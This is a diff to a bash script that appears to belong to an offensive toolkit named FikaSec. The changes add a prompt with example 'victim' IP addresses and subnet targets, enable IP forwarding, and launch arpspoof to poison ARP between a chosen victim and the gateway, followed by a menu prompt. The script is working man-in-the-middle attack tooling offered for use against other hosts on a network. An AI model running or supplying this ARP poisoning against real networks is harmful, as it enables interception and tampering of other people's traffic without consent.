@@ -1,4 +1,4 @@
-!/bin/bash
+#!/bin/bash
 #####################################################################################################################
 #                                                                                                                   #
 #                 	This script is written by Johan aka Saint, admin of Webbh4tt                                #
@@ -53,6 +53,7 @@ case $response in
 	iface=eth0
 ;;
 esac
+echo -n "Example individual victim: 10.10.4.9, or for the entire subnet 10.10.4.255"
 echo -n "Please enter target's IP: "
 read victimIP
 echo -n "Please enter Gateway's IP: "
@@ -63,7 +64,16 @@ echo -e "${RED_TEXT}Gateway:${END} $gatewayIP"
 echo -e "${BLUE}[*] Enabling IP Forwarding ${END}"
 echo "1" > /proc/sys/net/ipv4/ip_forward
 echo -e "${BLUE}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
-arpspoof -i $iface -t $victimIP $gatewayIP &
+arpspoof -i $iface -t $victimIP $gatewayIP
+read -r -p "Do you want to go back to the Main menu? [y/N] " response
+case $response in
+[yY][eE][sS]|[yY])
+	bash FikaSec
+;;
+    *)
+	:
+;;
+
 fi
 
 
